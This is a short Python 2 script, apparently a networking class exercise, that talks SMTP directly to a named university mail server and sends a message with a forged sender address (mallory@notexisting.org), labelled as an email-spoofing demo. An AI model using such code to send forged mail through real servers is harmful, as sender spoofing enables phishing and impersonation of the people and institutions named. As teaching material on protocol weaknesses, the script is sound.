from socket import *

heloCommand = 'HELO Rutvik\r\n'

mailserver = 'gaia.ecs.csus.edu'
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((mailserver, 25))
connect = clientSocket.recv(1024)
print connect

if connect[:3] != '220':
	print '220 reply not received from server.'

#Sending First HELO"

clientSocket.send(heloCommand)
recvhelo = clientSocket.recv(1024)
print recvhelo
if recvhelo[:3] != '250':
	print '250 reply not received from server.'

#Send AUTH command and print server respo

clientSocket.send("MAIL From: mallory@notexisting.org\r\n")
recv = clientSocket.recv(1024)
print recv
if recv[:3] != '250':
	print '250 reply not received from server.'

clientSocket.send("RCPT TO: rpatel@csus.edu\r\n")
recv2 = clientSocket.recv(1024)
print recv2
if recv2[:3] != '250':
	print '250 reply not received from server.'



clientSocket.send("DATA\r\n")
recv3 = clientSocket.recv(1024)
print recv3
if recv3[:3] != '354':
	print '354 reply not received from server.'


#Send D ata and print server response.

clientSocket.send("SUBJECT: Email Spoofing Demo! Do Not trust!\nThis is faked email for demo of email spoofing. Do not trust it! the code in this file is only for demo purpose. \n.\n\r\n")
recv4 = clientSocket.recv(1024)
print recv4
if recv4[:3] != '250':
	print '250 reply not received from server.'

#Send QUIT and print server response.
clientSocket.send("QUIT\r\n")
recv5 = clientSocket.recv(1024)
print recv5
if recv5[:3] != '221':
	print '221 reply not received from server.'



